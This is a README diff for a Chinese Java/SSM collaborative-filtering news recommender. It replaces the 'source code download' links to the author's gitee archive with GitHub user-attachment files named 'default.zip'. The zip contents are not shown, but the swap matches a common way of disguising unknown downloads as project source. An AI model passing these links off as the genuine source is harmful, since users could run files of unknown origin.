@@ -7,7 +7,8 @@
 
 Java+SSM(Spring+SpringMVC+Mybatis)+Mysql基于用户的协同过滤算法个性化新闻推荐系统，采用基于用户、项目、内容、聚类、混合的协同过滤推荐算法。
 
- **源码获取：** [协同过滤算法新闻推荐系统源码](https://gitee.com/lixusadeng/Collaborative-filtering-news-recommendation-system/blob/master/%E5%8D%8F%E5%90%8C%E8%BF%87%E6%BB%A4%E7%AE%97%E6%B3%95%E4%B8%AA%E6%80%A7%E5%8C%96%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81.zip)
+ **源码获取：** [协同过滤算法个性化新闻推荐系统源码.zip](https://github.com/user-attachments/files/18202253/default.zip)
+
 
 ### 一、项目简介
 
@@ -55,4 +56,4 @@ IDEA，jdk1.8，mysql5.5/mysql8，navicat数据库管理工具，tomcat7，SSM�
 ![输入图片说明](10%E6%8E%A8%E8%8D%90%E5%B1%95%E7%A4%BA.png)
 ![输入图片说明](11%E7%AE%97%E6%B3%95.png)
 
- **源码获取：** [协同过滤算法新闻推荐系统源码](https://gitee.com/lixusadeng/Collaborative-filtering-news-recommendation-system/blob/master/%E5%8D%8F%E5%90%8C%E8%BF%87%E6%BB%A4%E7%AE%97%E6%B3%95%E4%B8%AA%E6%80%A7%E5%8C%96%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81.zip)
+ **源码获取：** [协同过滤算法个性化新闻推荐系统源码.zip](https://github.com/user-attachments/files/18202254/default.zip)
